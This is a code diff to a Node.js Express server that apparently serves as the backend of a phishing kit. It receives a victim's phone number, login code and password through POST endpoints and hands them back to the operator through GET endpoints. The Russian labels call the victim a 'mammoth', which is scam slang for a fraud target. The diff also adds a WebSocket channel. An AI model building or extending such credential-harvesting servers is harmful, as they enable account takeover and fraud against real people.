@@ -1,29 +1,19 @@
 const express = require('express');
+const http = require('http');
+const WebSocket = require('ws');
+
 const app = express();
 const port = 3000;
-const cors = require('cors');
-// app.use((req, res, next) => {
-    //     res.header('Access-Control-Allow-Origin', '*');
-    //     res.header('Access-Control-Allow-Credentials', true);
-//     res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-//     res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
-//     if (req.method === 'OPTIONS') {
-//       res.sendStatus(200);
-//     } else {
-//       next();
-//     }
-//   });
+
+const server = http.createServer(app);
+const wss = new WebSocket.Server({ server });
+
 app.use(express.json());
-app.use(cors({
-    origin: '*',
-    methods: 'GET,HEAD,PUT,PATCH,POST,DELETE',
-    credentials: true,
-    optionsSuccessStatus: 204,
-    allowedHeaders: ['Content-Type', 'Authorization'],
-}));
+
 var pn;
 var code;
 var pass;
+
 app.post('/phone', (req, res) => {
     const phone_number = req.body.phone_number;
     if (typeof phone_number !== 'undefined') {
@@ -37,6 +27,7 @@ app.post('/phone', (req, res) => {
         return;
     }
 });
+
 app.get('/getPhone', (req, res) => {
     if(pn){
         res.send(`Номер телефона мамонта: \n ${pn}`);
@@ -47,6 +38,7 @@ app.get('/getPhone', (req, res) => {
         return 0;
     }
 });
+
 app.post('/authCode', (req, res) => {
     const value = req.body.value;
     if (typeof value !== 'undefined') {
@@ -60,6 +52,7 @@ app.post('/authCode', (req, res) => {
         return;
     }
 });
+
 app.get('/getCode', (req, res) => {
     if(code){
         res.send(`Код мамонта:\n${code}`);
@@ -70,6 +63,7 @@ app.get('/getCode', (req, res) => {
         return 0;
     }
 });
+
 app.post('/password', (req, res) => {
     const password = req.body.passwordInput;
     if (typeof password !== 'undefined') {
@@ -83,6 +77,7 @@ app.post('/password', (req, res) => {
         return;
     }
 });
+
 app.get('/getPassword', (req, res) => {
     if(pass){
         res.send(`Пароль мамонта: \n ${pass}`);
@@ -93,9 +88,25 @@ app.get('/getPassword', (req, res) => {
         return;
     }
 });
+
 app.get('/', (req, res) => {
     res.send('Salam Alejkum, Denis Penis!');
 });
-app.listen(port, () => {
+
+wss.on('connection', function connection(ws) {
+    console.log('WebSocket Server Connected');
+  
+    ws.on('message', function incoming(message) {
+        console.log('Received:', message);
+        // Пример ответа клиенту
+        ws.send('Server received your message: ' + message);
+    });
+  
+    ws.on('close', function close() {
+        console.log('WebSocket Server Disconnected');
+    });
+});
+
+server.listen(port, () => {
     console.log(`Сервер запущен на порту ${port}`);
 });
